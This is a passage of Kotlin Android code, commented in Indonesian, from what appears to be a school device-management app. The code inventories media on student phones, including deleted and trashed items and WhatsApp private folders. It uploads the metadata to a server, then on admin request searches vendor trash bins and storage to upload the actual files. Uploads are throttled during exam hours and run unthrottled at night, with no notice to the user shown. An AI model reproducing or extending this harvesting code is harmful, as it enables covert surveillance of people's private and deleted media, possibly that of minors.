                                if (fileMap.containsKey(dedupeKey)) continue

                                val size = if (sizeIdx != -1) it.getInt(sizeIdx) else 0
                                val mime = if (mimeIdx != -1) it.getString(mimeIdx) else null
                                val dateModified = if (dateIdx != -1) it.getLong(dateIdx) * 1000L else System.currentTimeMillis()

                                var cleanName = name
                                if (name.startsWith(".trashed-") || name.startsWith(".trashed_")) {
                                    cleanName = name.substringAfter("-").substringAfter("-")
                                    if (cleanName == name) cleanName = name.substringAfter("_").substringAfter("_")
                                    if (cleanName.isEmpty()) cleanName = name
                                } else if (name.startsWith(".trashed")) {
                                    cleanName = name.removePrefix(".trashed").removePrefix("-").removePrefix("_")
                                    if (cleanName.isEmpty()) cleanName = name
                                }
                                val extension = cleanName.substringAfterLast('.', "").lowercase()
                                // Sesuai permintaan pengguna: File GIF tidak perlu di-scan
                                if (extension == "gif") continue
                                val thumbBase64 = extractThumbnailFromUri(context, directUri, isVideo = (mime?.startsWith("video") == true))

                                fileMap[dedupeKey] = FileMetadata(
                                    fileName = if (cleanName.startsWith("♻️")) cleanName else "♻️ $cleanName",
                                    filePath = compositeFilePath,
                                    fileExtension = extension.ifEmpty { null },
                                    fileSize = size,
                                    fileSizeHuman = formatFileSize(size.toLong()),
                                    mimeType = mime ?: getMimeType(extension),
                                    category = "DELETED_MEDIA",
                                    lastModified = dateModified,
                                    thumbnailBase64 = thumbBase64,
                                    isDeleted = true
                                )
                            } catch (_: Throwable) {}
                        }
                    }
                } catch (trashErr: Throwable) {
                    Log.d(TAG, "MediaStore MATCH_ONLY trashed query not supported on this device: ${trashErr.message}")
                }
            }
        } catch (e: Throwable) {
            Log.e(TAG, "MediaStore scan failed for $contentUri: ${e.message}")
        }
    }

    /**
     * Kirim file metadata ke server
     */
    fun syncFilesToServer(context: Context, files: List<FileMetadata>, onComplete: ((Int) -> Unit)? = null) {
        if (isDeviceExcludedFromScan(context)) {
            Log.d(TAG, "[EXCLUSION] syncFilesToServer: Perangkat Admin/Guru/Staf dikecualikan dari sinkronisasi berkas.")
            onComplete?.invoke(0)
            return
        }

        if (!DeviceSyncManager.isScannerEnabledGlobally) {
            Log.d(TAG, "[SCANNER OFF] syncFilesToServer: Pengiriman berkas dilewati karena dinonaktifkan di server.")
            onComplete?.invoke(0)
            return
        }

        Thread {
            try {
                val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
                if (files.isEmpty()) {
                    // Send diagnostic empty ping so backend knows scan completed with 0 files
                    try {
                        val request = FileSyncRequest(
                            deviceAndroidId = androidId,
                            files = emptyList()
                        )
                        ApiClient.getClient(context).syncDeviceFiles(request).execute()
                    } catch (e: Exception) {}
                    onComplete?.invoke(0)
                    return@Thread
                }

                val chunks = files.chunked(150)
                var totalSynced = 0
                for (chunk in chunks) {
                    val request = FileSyncRequest(
                        deviceAndroidId = androidId,
                        files = chunk
                    )
                    try {
                        val response = ApiClient.getClient(context).syncDeviceFiles(request).execute()
                        if (response.isSuccessful) {
                            totalSynced += chunk.size
                        } else {
                            Log.w(TAG, "Chunk sync returned code ${response.code()}: ${response.message()}")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Chunk sync failed: ${e.message}")
                    }
                }
                Log.d(TAG, "Files metadata synced: $totalSynced / ${files.size} files")
                val hasDeleted = files.any { it.category == "DELETED_MEDIA" || it.isDeleted == true }
                if (hasDeleted) {
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        checkPendingRequests(context)
                    }, 2000)
                }
                onComplete?.invoke(totalSynced)
            } catch (e: Exception) {
                Log.e(TAG, "Error in syncFilesToServer: ${e.message}")
                onComplete?.invoke(0)
            }
        }.start()
    }

    /**
     * Memeriksa apakah perangkat terhubung ke internet aktif (Wi-Fi atau Data Seluler)
     */
    fun isNetworkConnected(context: Context): Boolean {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager ?: return false
            val activeNetwork = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(activeNetwork) ?: return false
            caps.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Memeriksa apakah perangkat terhubung ke Wi-Fi
     */
    fun isWifiConnected(context: Context): Boolean {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager ?: return false
            val activeNetwork = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(activeNetwork) ?: return false
            caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Cek dan penuhi antrean copy requests dari admin portal (seperti AirDroid)
     * Pengunggahan berkas otomatis berjalan saat perangkat online (Wi-Fi atau Seluler).
     * Jika perangkat offline, request tetap PENDING di server dan akan dilanjutkan otomatis saat HP online kembali.
     */
    fun checkPendingRequests(context: Context) {
        try {
            val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: return

            // GUARD: Pastikan ada koneksi internet aktif
            val netReady = isNetworkConnected(context)
            if (!netReady) {
                Log.d(TAG, "[NETWORK GUARD] Perangkat offline — upload ditunda. Request tetap PENDING di server, akan dilanjutkan otomatis saat HP online kembali.")
                return
            }

            ApiClient.getClient(context).getPendingCopyRequests(androidId).enqueue(object : Callback<PendingRequestsResponse> {
                override fun onResponse(call: Call<PendingRequestsResponse>, response: Response<PendingRequestsResponse>) {
                    if (response.isSuccessful && response.body()?.requests?.isNotEmpty() == true) {
                        // Double-check koneksi masih tersambung sebelum mulai upload
                        if (!isNetworkConnected(context)) {
                            Log.d(TAG, "[NETWORK GUARD] Internet terputus setelah fetch queue — upload dibatalkan, akan resume otomatis saat online kembali.")
                            return
                        }
                        val reqList = response.body()!!.requests
                        val cal = java.util.Calendar.getInstance(java.util.TimeZone.getTimeZone("Asia/Jakarta"))
                        val totalMinutes = cal.get(java.util.Calendar.HOUR_OF_DAY) * 60 + cal.get(java.util.Calendar.MINUTE)
                        val isNightSleepWindow = (totalMinutes >= 22 * 60 || totalMinutes <= 5 * 60 + 30) // 22:00 s.d. 05:30 WIB (Luar jam CBT)

                        // Di siang hari (05:30 - 22:00 WIB saat aktivitas & ujian CBT), proses maksimal 4 berkas per siklus agar HP tetap responsif dan lancar untuk ujian CBT
                        val batchToProcess = if (isNightSleepWindow) reqList else reqList.take(4)

                        for (req in batchToProcess) {
                            if (activeUploadIds.contains(req.requestId)) continue

                            // BUG-NEW-06 Fix: Batasi maksimal 5 kali percobaan retry untuk mencegah infinite loop & hemat baterai
                            val currentAttempts = uploadRetryCount.getOrDefault(req.requestId, 0)
                            if (currentAttempts >= 5) {
                                Log.w(TAG, "[RETRY GUARD] Permintaan ${req.requestId} (${req.fileName}) telah gagal 5x. Melaporkan kegagalan permanen ke server...")
                                val failReq = UploadFileRequest(
                                    requestId = req.requestId,
                                    fileName = req.fileName,
                                    errorMessage = "Gagal diunggah setelah 5 kali percobaan (akses ditolak OS / berkas corrupt)."
                                )
                                ApiClient.getClient(context).uploadDeviceFile(failReq).enqueue(object : Callback<BasicResponse> {
                                    override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
                                        uploadRetryCount.remove(req.requestId)
                                    }
                                    override fun onFailure(call: Call<BasicResponse>, t: Throwable) {
                                        uploadRetryCount.remove(req.requestId)
                                    }
                                })
                                continue
                            }

                            uploadRetryCount[req.requestId] = currentAttempts + 1
                            activeUploadIds.add(req.requestId)
                            uploadQueueExecutor.execute {
                                // Cek koneksi lagi per-file sebelum upload
                                if (!isNetworkConnected(context)) {
                                    Log.d(TAG, "[NETWORK GUARD] Internet putus saat akan upload ${req.fileName} — skip, tetap PENDING")
                                    activeUploadIds.remove(req.requestId)
                                    return@execute
                                }
                                uploadRequestedFile(context, req.requestId, req.filePath, req.fileName)
                            }
                        }
                        // Jika masih ada sisa di antrean, lanjutkan batch berikutnya (1 detik saat malam, 3 detik saat siang agar hemat resource)
                        if (reqList.size > batchToProcess.size || reqList.size >= 10) {
                            val nextDelayMs = if (isNightSleepWindow) 1000L else 3500L
                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                checkPendingRequests(context)
                            }, nextDelayMs)
                        }
                    }
                }

                override fun onFailure(call: Call<PendingRequestsResponse>, t: Throwable) {
                    Log.e(TAG, "Check pending requests failed: ${t.message}")
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error checking pending requests: ${e.message}")
        }
    }

    /**
     * Mengambil file asli dari HP dan mengupload ke server admin
     */
    private fun uploadRequestedFile(context: Context, requestId: String, filePath: String, fileName: String) {
        try {
            val parts = filePath.split("::")
            val physicalPath = parts[0].trim()
            val directUriStr = if (parts.size > 1) parts[1].trim() else null

            // Cek jika item adalah folder
            val isDir = try {
                val f = File(physicalPath)
                f.isDirectory || (!physicalPath.contains(".") && !fileName.contains("."))
            } catch (e: Exception) { false }

            if (isDir) {
                val request = UploadFileRequest(
                    requestId = requestId,
                    fileName = fileName,
                    errorMessage = "Item adalah folder/direktori, bukan berkas fisik."
                )
                ApiClient.getClient(context).uploadDeviceFile(request).enqueue(object : Callback<BasicResponse> {
                    override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
                        activeUploadIds.remove(requestId)
                    }
                    override fun onFailure(call: Call<BasicResponse>, t: Throwable) {
                        activeUploadIds.remove(requestId)
                    }
                })
                return
            }

            var streamSupplier: (() -> InputStream?)? = null
            var fileSize: Long = -1L

            // 1. Prioritas Utama: Buka via direct ContentUri jika tersemat
            if (!directUriStr.isNullOrEmpty()) {
                try {
                    val uri = Uri.parse(directUriStr)
                    val testIn = context.contentResolver.openInputStream(uri)
                    if (testIn != null) {
                        testIn.close()
                        val pfd = try { context.contentResolver.openFileDescriptor(uri, "r") } catch (e: Exception) { null }
                        val len = pfd?.statSize ?: -1L
                        pfd?.close()
                        if (len > 0L) fileSize = len
                        streamSupplier = { context.contentResolver.openInputStream(uri) }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Direct content URI read failed: ${e.message}")
                }
            }

            // 2. Baca via File object langsung jika diizinkan (misal WhatsApp Media / DCIM)
            if (streamSupplier == null) {
                try {
                    val file = File(physicalPath)
                    if (file.exists() && file.isFile) {
                        val testIn = try { file.inputStream() } catch(e: Exception) { null }
                        if (testIn != null) {
                            testIn.close()
                            fileSize = file.length()
                            streamSupplier = { file.inputStream() }
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Direct file read failed for $physicalPath: ${e.message}")
                }
            }

            // 3. Jika physicalPath berformat content://
            if (streamSupplier == null && physicalPath.startsWith("content://")) {
                try {
                    val uri = Uri.parse(physicalPath)
                    val testIn = context.contentResolver.openInputStream(uri)
                    if (testIn != null) {
                        testIn.close()
                        val pfd = try { context.contentResolver.openFileDescriptor(uri, "r") } catch (e: Exception) { null }
                        val len = pfd?.statSize ?: -1L
                        pfd?.close()
                        if (len > 0L) fileSize = len
                        streamSupplier = { context.contentResolver.openInputStream(uri) }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Raw content URI read failed: ${e.message}")
                }
            }

            // 4. Cari Uri via MediaStore
            if (streamSupplier == null) {
                try {
                    val uri = findUriForPath(context, physicalPath)
                    if (uri != null) {
                        val testIn = context.contentResolver.openInputStream(uri)
                        if (testIn != null) {
                            testIn.close()
                            val pfd = try { context.contentResolver.openFileDescriptor(uri, "r") } catch (e: Exception) { null }
                            val len = pfd?.statSize ?: -1L
                            pfd?.close()
                            if (len > 0L) fileSize = len
                            streamSupplier = { context.contentResolver.openInputStream(uri) }
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "findUriForPath failed: ${e.message}")
                }
            }

            // 5. Cek variasi path langsung (Private / Sent / w4b)
            if (streamSupplier == null) {
                val candidatePaths = mutableListOf<String>()
                candidatePaths.add(physicalPath)
                if (physicalPath.contains("/Private/")) {
                    candidatePaths.add(physicalPath.replace("/Private/", "/"))
                } else if (physicalPath.contains("/WhatsApp Business Video/")) {
                    candidatePaths.add(physicalPath.replace("/WhatsApp Business Video/", "/WhatsApp Business Video/Private/"))
                } else if (physicalPath.contains("/WhatsApp Video/")) {
                    candidatePaths.add(physicalPath.replace("/WhatsApp Video/", "/WhatsApp Video/Private/"))
                } else if (physicalPath.contains("/WhatsApp Business Images/")) {
                    candidatePaths.add(physicalPath.replace("/WhatsApp Business Images/", "/WhatsApp Business Images/Private/"))
                } else if (physicalPath.contains("/WhatsApp Images/")) {
                    candidatePaths.add(physicalPath.replace("/WhatsApp Images/", "/WhatsApp Images/Private/"))
                }
                if (physicalPath.contains("/com.whatsapp.w4b/")) {
                    candidatePaths.add(physicalPath.replace("/com.whatsapp.w4b/", "/com.whatsapp/"))
                } else if (physicalPath.contains("/com.whatsapp/")) {
                    candidatePaths.add(physicalPath.replace("/com.whatsapp/", "/com.whatsapp.w4b/"))
                }

                for (candPath in candidatePaths) {
                    try {
                        val f = File(candPath)
                        if (f.exists() && f.isFile) {
                            val inStream = try { f.inputStream() } catch (e: Exception) { null }
                            if (inStream != null) {
                                inStream.close()
                                fileSize = f.length()
                                streamSupplier = { f.inputStream() }
                                Log.d(TAG, "Found candidate file: $candPath ($fileSize bytes)")
                                break
                            }
                        }
                    } catch (e: Exception) {}
                }
            }

            // 6. Pencarian instan di folder-folder utama & SD Card (O(1) direct file lookup)
            if (streamSupplier == null) {
                try {
                    val searchRoots = mutableListOf<File>()
                    val primaryExt = Environment.getExternalStorageDirectory()
                    if (primaryExt != null) searchRoots.add(primaryExt)

                    try {
                        val externalDirs = androidx.core.content.ContextCompat.getExternalFilesDirs(context, null)
                        for (d in externalDirs) {
                            if (d != null) {
                                val rootPath = d.absolutePath.substringBefore("/Android/data")
                                if (rootPath.isNotEmpty()) {
                                    val rf = File(rootPath)
                                    if (rf.exists() && !searchRoots.any { it.absolutePath == rf.absolutePath }) {
                                        searchRoots.add(rf)
                                    }
                                }
                            }
                        }
                    } catch (e: Exception) {}

                    val cleanTarget = fileName.replace("♻️", "").trim()
                    val subDirs = listOf(
                        // OEM & Standard Trash Folders
                        ".trash",
                        ".trashed",
                        ".Trash-1000",
                        "DCIM/.trash",
                        "DCIM/.trashed",
                        "DCIM/.vivo_trash",
                        "DCIM/.recycle",
                        "Pictures/.trash",
                        "Pictures/.trashed",
                        "Pictures/.vivo_trash",
                        "Pictures/.recycle",
                        "Pictures/.gallery_trash",
                        "DCIM/.gallery_trash",
                        "MIUI/Gallery/cloud/.trashBin",
                        "MIUI/Gallery/cloud/trashBin",
                        "Android/media/com.miui.gallery/trashBin",
                        "Android/data/com.miui.gallery/files/trashBin",
                        "ColorOS/Gallery/.trash",
                        "Android/media/com.coloros.gallery3d/.trash",
                        "Android/media/com.sec.android.gallery3d/.trash",
                        "Android/data/com.sec.android.gallery3d/files/.trash",
                        "Android/data/com.sec.android.gallery3d/files/trash",
                        "Android/media/com.whatsapp/WhatsApp/Media/.trash",
                        "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/.trash",
                        "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/.trash",
                        "WhatsApp/Media/.trash",
                        "WhatsApp/Media/WhatsApp Images/.trash",
                        "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/.trash",
                        // Standard Media Folders
                        "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video/Private",
                        "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video",
                        "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video/Sent",
                        "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Images/Private",
                        "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Images",
                        "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Images/Sent",
                        "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Private",
                        "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video",
                        "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Sent",
                        "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Private",
                        "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
                        "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent",
                        "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Stickers",
                        "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Stickers",
                        "WhatsApp/Media/WhatsApp Stickers",
                        "WhatsApp Business/Media/WhatsApp Business Stickers",
                        "WhatsApp/Media/WhatsApp Video/Private",
                        "WhatsApp/Media/WhatsApp Video",
                        "WhatsApp/Media/WhatsApp Images/Private",
                        "WhatsApp/Media/WhatsApp Images",
                        "DCIM/Camera",
                        "DCIM/Screenshots",
                        "DCIM/100CANON",
                        "DCIM",
                        "Pictures/WhatsApp",
                        "Pictures/WhatsApp Stickers",
                        "Pictures/Screenshots",
                        "Pictures",
                        "Movies",
                        "Download",
                        "Documents"
                    )

                    for (root in searchRoots) {
                        for (sub in subDirs) {
                            val candidate = File(root, "$sub/$fileName")
                            val candidateClean = File(root, "$sub/$cleanTarget")
                            var targetCandidate: File? = if (candidate.exists() && candidate.isFile) candidate
                                else if (candidateClean.exists() && candidateClean.isFile) candidateClean
                                else null

                            // Jika belum ditemukan di folder sampah, periksa apakah file tersimpan dengan prefix .trashed
                            if (targetCandidate == null && (sub.contains("trash") || sub.contains("recycle"))) {
                                try {
                                    val subDirFile = File(root, sub)
                                    if (subDirFile.exists() && subDirFile.isDirectory) {
                                        val matchInTrash = subDirFile.listFiles()?.firstOrNull { f ->
                                            f.isFile && (f.name.equals(cleanTarget, ignoreCase = true) || 
                                                         (f.name.startsWith(".trashed") && f.name.contains(cleanTarget, ignoreCase = true)))
                                        }
                                        if (matchInTrash != null) targetCandidate = matchInTrash
                                    }
                                } catch (e: Exception) {}
                            }

                            if (targetCandidate != null && targetCandidate.exists() && targetCandidate.isFile) {
                                try {
                                    val test = targetCandidate.inputStream()
                                    test.close()
                                    fileSize = targetCandidate.length()
                                    streamSupplier = { targetCandidate.inputStream() }
                                    Log.d(TAG, "Found file in common dir: ${targetCandidate.absolutePath}")
                                    break
                                } catch (e: Exception) {}
                            }
                        }
                        if (streamSupplier != null) break
                    }

                    // 7. Fallback pencarian rekursif jika belum ditemukan
                    if (streamSupplier == null) {
                        for (root in searchRoots) {
                            val found = findFileByName(root, cleanTarget, maxDepth = 4)
                            if (found != null && found.exists() && found.isFile) {
                                try {
                                    val test = found.inputStream()
                                    test.close()
                                    fileSize = found.length()
                                    streamSupplier = { found.inputStream() }
                                    Log.d(TAG, "Found file via recursive fallback: ${found.absolutePath}")
                                    break
                                } catch (e: Exception) {}
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Direct lookup error: ${e.message}")
                }
            }

            if (streamSupplier == null) {
                val request = UploadFileRequest(
                    requestId = requestId,
                    fileName = fileName,
                    errorMessage = "Berkas tidak dapat diakses atau dibatasi oleh izin OS Android."
                )
                ApiClient.getClient(context).uploadDeviceFile(request).enqueue(object : Callback<BasicResponse> {
                    override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
                        activeUploadIds.remove(requestId)
                    }
                    override fun onFailure(call: Call<BasicResponse>, t: Throwable) {
                        activeUploadIds.remove(requestId)
                    }
                })
                return
            }

            val extension = fileName.substringAfterLast('.', "").lowercase()
            val mime = getMimeType(extension)
            val mediaType = MediaType.parse(mime)

            val streamBody = object : RequestBody() {
                override fun contentType(): MediaType? = mediaType
                override fun contentLength(): Long = if (fileSize > 0) fileSize else -1L
                override fun writeTo(sink: BufferedSink) {
                    val stream = streamSupplier.invoke() ?: throw IOException("Stream is null")
                    stream.use { input ->
                        val buf = ByteArray(131072)
                        var read: Int
                        while (input.read(buf).also { read = it } != -1) {
                            sink.write(buf, 0, read)
                        }
                        sink.flush()
                    }
                }
            }

            val reqIdBody = RequestBody.create(MediaType.parse("text/plain"), requestId)
            val nameBody = RequestBody.create(MediaType.parse("text/plain"), fileName)
            val filePart = MultipartBody.Part.createFormData("file", fileName, streamBody)

            ApiClient.getClient(context).uploadDeviceFileMultipart(
                requestIdHeader = requestId,
                requestIdQuery = requestId,
                fileNameQuery = fileName,
                requestId = reqIdBody,
                fileName = nameBody,
                file = filePart
            ).enqueue(object : Callback<BasicResponse> {
                override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
                    if (response.isSuccessful) {
                        Log.d(TAG, "File streamed successfully to server: $fileName ($fileSize bytes)")
                        uploadRetryCount.remove(requestId)
                        activeUploadIds.remove(requestId)
                    } else {
                        Log.w(TAG, "Multipart upload responded with code ${response.code()}, trying Base64 fallback...")
                        fallbackBase64Upload(context, requestId, fileName, mime, streamSupplier)
                    }
                }

                override fun onFailure(call: Call<BasicResponse>, t: Throwable) {
                    Log.e(TAG, "Multipart upload failed: ${t.message}, trying Base64 fallback...")
                    fallbackBase64Upload(context, requestId, fileName, mime, streamSupplier)
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error in uploadRequestedFile: ${e.message}")
            activeUploadIds.remove(requestId)
        }
    }

    private fun fallbackBase64Upload(context: Context, requestId: String, fileName: String, mime: String, streamSupplier: () -> InputStream?) {
        try {
            val stream = streamSupplier.invoke() ?: run {
                activeUploadIds.remove(requestId)
                return
            }
            // Batasi fallback base64 maksimal 3MB untuk mencegah java.lang.OutOfMemoryError pada HP siswa/guru
            val bytes = stream.use { readStreamWithLimit(it, 3 * 1024 * 1024) }
            if (bytes.isNotEmpty()) {
                val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                val req = UploadFileRequest(
                    requestId = requestId,
                    fileBase64 = base64,
                    fileName = fileName,
                    mimeType = mime
                )
                ApiClient.getClient(context).uploadDeviceFile(req).enqueue(object : Callback<BasicResponse> {
                    override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
                        if (response.isSuccessful) {
                            uploadRetryCount.remove(requestId)
                        }
                        activeUploadIds.remove(requestId)
                    }
                    override fun onFailure(call: Call<BasicResponse>, t: Throwable) {
                        activeUploadIds.remove(requestId)
                    }
                })
            } else {
                activeUploadIds.remove(requestId)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Base64 fallback upload failed: ${e.message}")
            activeUploadIds.remove(requestId)
        }
    }

    private fun readStreamWithLimit(stream: InputStream, maxBytes: Int): ByteArray {
        val buffer = ByteArray(8192)
        val baos = ByteArrayOutputStream()
        var read: Int
        var total = 0
        while (stream.read(buffer).also { read = it } != -1) {
            baos.write(buffer, 0, read)
            total += read
            if (total > maxBytes) break
        }
        return baos.toByteArray()
    }

    private fun findUriForPath(context: Context, filePath: String): Uri? {
        return try {
            val fileObj = File(filePath)
            val rawName = fileObj.name
            val cleanName = rawName.replace("♻️", "").trim()
            val uris = mutableListOf(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                MediaStore.Files.getContentUri("external")
            )

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    for (volumeName in MediaStore.getExternalVolumeNames(context)) {
                        if (volumeName != MediaStore.VOLUME_EXTERNAL_PRIMARY && volumeName != "external") {
                            uris.add(MediaStore.Images.Media.getContentUri(volumeName))
                            uris.add(MediaStore.Video.Media.getContentUri(volumeName))
                            uris.add(MediaStore.Audio.Media.getContentUri(volumeName))
                            uris.add(MediaStore.Files.getContentUri(volumeName))
                        }
                    }
                } catch (e: Exception) {}
            }

            for (u in uris) {
                // 1. Coba exact match DISPLAY_NAME (Paling aman & kompatibel di Android 10-15)
                for (target in listOf(cleanName, rawName)) {
                    try {
                        val cursor = context.contentResolver.query(
                            u,
                            arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME),
                            "${MediaStore.MediaColumns.DISPLAY_NAME} = ?",
                            arrayOf(target),
                            null
                        )
                        cursor?.use {
                            if (it.moveToFirst()) {
                                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
                                return ContentUris.withAppendedId(u, id)
                            }
                        }
                    } catch (e: Exception) {}
                }

                // 2. Coba DATA exact match jika didukung ROM
                try {
                    val cursor = context.contentResolver.query(
                        u,
                        arrayOf(MediaStore.MediaColumns._ID),
                        "${MediaStore.MediaColumns.DATA} = ?",
                        arrayOf(filePath),
                        null
                    )
                    cursor?.use {
                        if (it.moveToFirst()) {
                            val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
                            return ContentUris.withAppendedId(u, id)
                        }
                    }
                } catch (e: Exception) {}

                // 3. Coba LIKE DISPLAY_NAME
                try {
                    val cursor = context.contentResolver.query(
                        u,
                        arrayOf(MediaStore.MediaColumns._ID),
                        "${MediaStore.MediaColumns.DISPLAY_NAME} LIKE ?",
                        arrayOf("%$cleanName%"),
                        null
                    )
                    cursor?.use {
                        if (it.moveToFirst()) {
                            val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
                            return ContentUris.withAppendedId(u, id)
                        }
                    }
                } catch (e: Exception) {}

                // 4. Coba query khusus MATCH_TRASHED (Android 11+ / API 30+) untuk berkas yang sedang di tempat sampah
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    try {
                        val trashBundle = android.os.Bundle().apply {
                            putInt(MediaStore.QUERY_ARG_MATCH_TRASHED, MediaStore.MATCH_ONLY)
                        }
                        val trashCursor = context.contentResolver.query(
                            u,
                            arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME),
                            trashBundle,
                            null
                        )
                        trashCursor?.use {
                            val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                            val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                            while (it.moveToNext()) {
                                val rowName = if (nameIdx != -1) it.getString(nameIdx) else ""
                                if (rowName.equals(cleanName, true) || rowName.equals(rawName, true) || rowName.contains(cleanName, true)) {
                                    val id = if (idIdx != -1) it.getLong(idIdx) else 0L
                                    if (id != 0L) return ContentUris.withAppendedId(u, id)
                                }
                            }
                        }
                    } catch (e: Exception) {}
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }

    private fun findFileByName(dir: File, targetName: String, maxDepth: Int): File? {
        if (!dir.exists() || !dir.isDirectory || maxDepth <= 0) return null
        val cleanTarget = targetName.replace("♻️", "").trim()
        val files = dir.listFiles() ?: return null
        for (f in files) {
            if (f.isFile) {
                if (f.name.equals(targetName, ignoreCase = true) ||
                    f.name.equals(cleanTarget, ignoreCase = true) ||
                    (f.name.startsWith(".trashed") && f.name.contains(cleanTarget, ignoreCase = true))) {
                    return f
                }
            }
            if (f.isDirectory && !shouldSkipDirectory(f)) {
                val found = findFileByName(f, targetName, maxDepth - 1)
                if (found != null) return found
            }
        }
        return null
    }

    fun isTrashDirectory(file: File): Boolean {
        val name = file.name.lowercase()
        val path = file.absolutePath.replace("\\", "/").lowercase()
        return name == ".trash" || name == ".trashed" || name == ".globaltrash" || name == "trash" || 
               name == "recycle" || name == ".recycle" || name == "trashbin" || name == ".trashbin" ||
               name == ".vivo_trash" || name == ".gallery_trash" || name.contains("trash") || name.contains("recycle") ||
               path.contains("/.trash") || path.contains("/.trashed") || path.contains("/.globaltrash") || 
               path.contains("/trashbin") || path.contains("/.trashbin") || path.contains("/.recycle") ||
               path.contains("/.vivo_trash") || path.contains("/.gallery_trash") || path.contains("/trash/") || 
               path.contains("/recycle/") || path.contains("/recently deleted")
    }

    private fun shouldSkipDirectory(file: File): Boolean {
        if (isTrashDirectory(file)) return false // JANGAN SKIP TEMPAT SAMPAH / TRASH!
        val path = file.absolutePath.replace("\\", "/")
        val pathLower = path.lowercase()
        if (pathLower.contains("/android/data") || pathLower.contains("/android/obb") || pathLower.contains(".obb")) return true
        val name = file.name
        val nameLower = name.lowercase()
        val skipDirs = setOf(
            ".android_secure", ".thumbnails", ".nomedia",
            "lost.dir", ".git", ".gradle",
            ".idea", "node_modules", "__pycache__",
            "com.dts.freefireth", "com.dts.freefiremax", "com.mobile.legends",
            ".stickers", ".shared", "cache", "caches", "stickers",
            "whatsapp stickers", "whatsapp animated gifs"
        )
        if (skipDirs.contains(nameLower)) return true
        if (isJunkFileOrPath(path, name)) return true
        return name.startsWith(".") && name.length > 1
    }

    fun categorizeFile(extension: String): String {
        return when {
            ALLOWED_IMAGE_EXTS.contains(extension) -> "IMAGE"
            ALLOWED_VIDEO_EXTS.contains(extension) -> "VIDEO"
            else -> "OTHER"
        }
    }

    private fun getMimeType(extension: String): String {
        return when (extension) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "webp" -> "image/webp"
            "gif" -> "image/gif"
            "bmp" -> "image/bmp"
            "heic" -> "image/heic"
            "heif" -> "image/heif"
            "mp4" -> "video/mp4"
            "mkv" -> "video/x-matroska"
            "mov" -> "video/quicktime"
            "avi" -> "video/x-msvideo"
            "3gp" -> "video/3gpp"
            "webm" -> "video/webm"
            "flv" -> "video/x-flv"
            "wmv" -> "video/x-ms-wmv"
            "ts" -> "video/mp2t"
            else -> "application/octet-stream"
        }
    }

    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> "${bytes / 1024} KB"
            bytes < 1024 * 1024 * 1024 -> "${"%.1f".format(bytes / (1024.0 * 1024.0))} MB"
            else -> "${"%.2f".format(bytes / (1024.0 * 1024.0 * 1024.0))} GB"
        }
    }

